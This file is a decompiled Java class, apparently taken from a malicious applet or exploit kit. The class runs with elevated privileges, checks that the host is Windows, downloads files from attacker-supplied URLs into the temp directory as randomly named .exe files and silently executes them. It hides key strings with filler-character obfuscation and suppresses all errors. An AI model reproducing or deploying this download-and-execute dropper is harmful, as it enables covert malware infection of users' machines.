// 
// Decompiled by Procyon v0.5.30
// 

package ghsdr;

import java.security.AccessController;
import java.io.InputStream;
import java.io.FileOutputStream;
import java.io.File;
import java.net.URL;
import java.security.PrivilegedExceptionAction;

public class KGwedsdv implements PrivilegedExceptionAction
{
    public static String data;
    public static String cc;
    
    public static byte[] StringToBytes(final String s) {
        final int n = 2;
        final int n2 = 16;
        final byte[] array = new byte[s.length() / n];
        for (int i = 0; i < s.length(); i += n) {
            array[i / n] = (byte)((Character.digit(s.charAt(i), n2) << 4) + Character.digit(s.charAt(i + 1), n2));
        }
        return array;
    }
    
    @Override
    public Object run() throws Exception {
        if (KGwedsdv.data == null) {
            return null;
        }
        try {
            if (System.getProperty("osy.nayymeyy".replace("y", "")).indexOf("WTTTTTindoTTTTwTTTTs".replace("T", "")) >= 0) {
                int int1 = 1;
                if (KGwedsdv.cc != null) {
                    int1 = Integer.parseInt(KGwedsdv.cc);
                }
                final Runtime runtime = Runtime.getRuntime();
                final int n = 1024;
                for (int i = 0; i < int1; ++i) {
                    final URL url = new URL(KGwedsdv.data + Integer.toString(i));
                    url.openConnection();
                    final InputStream openStream = url.openStream();
                    final String string = System.getProperty("jUUUavUa.iUo.UUUtmpUdUUiUUUrUUU".replace("U", "")) + File.separator + Math.random() + ".4exe".replace("4", "");
                    final FileOutputStream fileOutputStream = new FileOutputStream(string);
                    int n2 = 0;
                    int read;
                    while ((read = openStream.read()) != -1) {
                        fileOutputStream.write(read);
                        ++n2;
                    }
                    openStream.close();
                    fileOutputStream.close();
                    if (n2 >= n) {
                        runtime.exec(string);
                    }
                }
            }
        }
        catch (Exception ex) {}
        return null;
    }
    
    public KGwedsdv() {
        try {
            AccessController.doPrivileged((PrivilegedExceptionAction<Object>)this);
        }
        catch (Exception ex) {}
    }
    
    static {
        KGwedsdv.data = null;
        KGwedsdv.cc = null;
    }
}
